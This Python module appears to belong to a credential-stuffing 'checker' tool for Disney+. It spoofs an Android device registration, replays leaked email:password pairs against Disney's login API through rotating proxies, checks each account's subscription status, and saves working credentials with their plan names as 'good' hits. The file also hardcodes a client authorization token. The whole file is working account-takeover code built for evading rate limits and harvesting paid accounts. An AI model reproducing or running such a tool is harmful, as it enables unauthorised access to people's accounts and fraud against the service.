from __main__ import checker
from modules.functions import set_proxy,log,save
from requests import get,post
from random import choices
from string import ascii_letters,digits
from datetime import datetime
from json import loads

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        header_1 = {  
            "content-type":"application/json",
            "Accept": "application/json" ,
            "Authorization": "ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA" ,
            "X-BAMSDK-Platform-Id": "android" ,
            "X-Application-Version": "google" ,
            "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
            "X-BAMSDK-Platform": "android" ,
            "X-BAMSDK-Version": "6.1.1" ,
            "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2" ,
            "X-BAMSDK-Transaction-ID": "",
            "User-Agent": "BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" ,
            "Host": "disney.api.edge.bamgrid.com" ,
            "Connection": "Keep-Alive" ,
            "Accept-Encoding": "gzip"
        }
        header_2 = {
            "content-type":"application/json",
            "Accept": "application/json" ,
            "Authorization": "" ,
            "X-BAMSDK-Platform-Id": "android" ,
            "X-Application-Version": "google" ,
            "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
            "X-BAMSDK-Platform": "android" ,
            "X-BAMSDK-Version": "6.1.1" ,
            "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2" ,
            "X-BAMSDK-Transaction-ID": "" ,
            "User-Agent": "BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" ,
            "Host": "disney.api.edge.bamgrid.com" ,
            "Connection": "Keep-Alive" ,
            "Accept-Encoding": "gzip" 
        }
        header_3 = {
            "Accept": "application/json" ,
            "Authorization": "",
            "X-BAMSDK-Platform-Id": "android" ,
            "X-Application-Version": "google" ,
            "X-BAMSDK-Client-ID": "disney-svod-3d9324fc" ,
            "X-BAMSDK-Platform": "android" ,
            "X-BAMSDK-Version": "6.1.1" ,
            "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2" ,
            "X-BAMSDK-Transaction-ID": "" ,
            "User-Agent": "BAMSDK/v6.1.1 (disney-svod-3d9324fc 1.17.1.0; v3.0/v6.1.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)" ,
            "Host": "disney.api.edge.bamgrid.com" ,
            "Connection": "Keep-Alive" ,
            "Accept-Encoding": "gzip" 
        }
        
        id = "".join(choices(ascii_letters+digits,k=16))
        pid = "".join(choices(ascii_letters+digits,k=24))
        
        data_1 = "{\"query\":\"mutation ($registerDevice: RegisterDeviceInput!) {registerDevice(registerDevice: $registerDevice) {__typename}}\",\"variables\":{\"registerDevice\":{\"applicationRuntime\":\"android\",\"attributes\":{\"osDeviceIds\":[{\"identifier\":\""+id+"\",\"type\":\"android.vendor.id\"},{\"identifier\":\""+pid+"\",\"type\":\"android.advertising.id\"}],\"manufacturer\":\"OnePlus\",\"model\":\"A5010\",\"operatingSystem\":\"Android\",\"operatingSystemVersion\":\"7.1.2\"},\"deviceFamily\":\"android\",\"deviceLanguage\":\"en\",\"deviceProfile\":\"phone\"}}}"
        data_2 = """{\"operationName\":\"login\",\"variables\":{\"input\":{\"email\":\""""+email+"""\",\"password\":\""""+password+"""\"},\"includePaywall\":false,\"includeActionGrant\":false},\"query\":\"mutation login($input: LoginInput!, $includePaywall: Boolean!, $includeActionGrant: Boolean!) { login(login: $input) { __typename account { __typename ...accountGraphFragment } actionGrant @include(if: $includeActionGrant) activeSession { __typename ...sessionGraphFragment } paywall @include(if: $includePaywall) { __typename ...paywallGraphFragment } } } fragment accountGraphFragment on Account { __typename id activeProfile { __typename id } profiles { __typename ...profileGraphFragment } parentalControls { __typename isProfileCreationProtected } flows { __typename star { __typename isOnboarded } } attributes { __typename email emailVerified userVerified locations { __typename manual { __typename country } purchase { __typename country } registration { __typename geoIp { __typename country } } } } } fragment profileGraphFragment on Profile { __typename id name maturityRating { __typename ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating } isAge21Verified flows { __typename star { __typename eligibleForOnboarding isOnboarded } } attributes { __typename isDefault kidsModeEnabled groupWatch { __typename enabled } languagePreferences { __typename appLanguage playbackLanguage preferAudioDescription preferSDH subtitleLanguage subtitlesEnabled } parentalControls { __typename isPinProtected kidProofExitEnabled liveAndUnratedContent { __typename enabled } } playbackSettings { __typename autoplay backgroundVideo prefer133 } avatar { __typename id userSelected } } } fragment sessionGraphFragment on Session { __typename sessionId device { __typename id } entitlements experiments { __typename featureId variantId version } homeLocation { __typename countryCode } inSupportedLocation isSubscriber location { __typename countryCode } portabilityLocation { __typename countryCode } preferredMaturityRating { __typename impliedMaturityRating ratingSystem } } fragment paywallGraphFragment on Paywall { __typename skus { __typename name sku entitlements } paywallHash context assertions { __typename documentCode } }\"}"""
        
        header_1["X-BAMSDK-Transaction-ID"] = pid
        header_2["X-BAMSDK-Transaction-ID"] = pid
        header_3["X-BAMSDK-Transaction-ID"] = pid
        
        try:
            r = post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql",headers=header_1,json=loads(data_1),proxies=set_proxy(proxy),timeout=checker.timeout).json()
            token = r["extensions"]["sdk"]["token"]["accessToken"]
            header_2["Authorization"] = token

            r = post("https://disney.api.edge.bamgrid.com/v1/public/graphql",json=loads(data_2),headers=header_2,proxies=set_proxy(proxy),timeout=checker.timeout)
            if "data\":null" in r.text:
                retries += 1
            elif "accessToken" in r.text:
                token = r.text.split('"accessToken\":"')[1].split("\",")[0]
                header_3["Authorization"] = token

                r = get("https://disney.api.edge.bamgrid.com/subscriptions",headers=header_3,proxies=set_proxy(proxy),timeout=checker.timeout)
                if "type\":\"UNSUBSCRIBED" in r.text or r.text == "[]":
                    if not checker.cui:
                        log("custom",email+":"+password,"Disney")
                    save("Disney","custom",checker.time,email+":"+password)
                    checker.custom += 1
                    checker.cpm += 1
                    return
                elif "expirationDate" in r.text:
                    expire = r.text.split("\"expirationDate\":\"")[1].split("T")[0]
                    plan = r.text.split("\"name\":\"")[1].split("\",")[0]

                    now = int(datetime.now().strftime("%Y%m%d"))
                    exp = int(expire.replace("-",""))

                    if exp > now:
                        if not checker.cui:
                            log("good",email+":"+password,"Disney")
                        save("Disney","good",checker.time,email+":"+password+f" Plan: {plan}")
                        checker.good += 1
                        checker.cpm += 1
                        return
                    else:
                        if not checker.cui:
                            log("custom",email+":"+password,"Disney")
                        save("Disney","custom",checker.time,email+":"+password)
                        checker.custom += 1
                        checker.cpm += 1
                        return
                else:
                    raise
            else:
                raise
        except:
            checker.errors += 1
    checker.bad += 1
    checker.cpm += 1
    return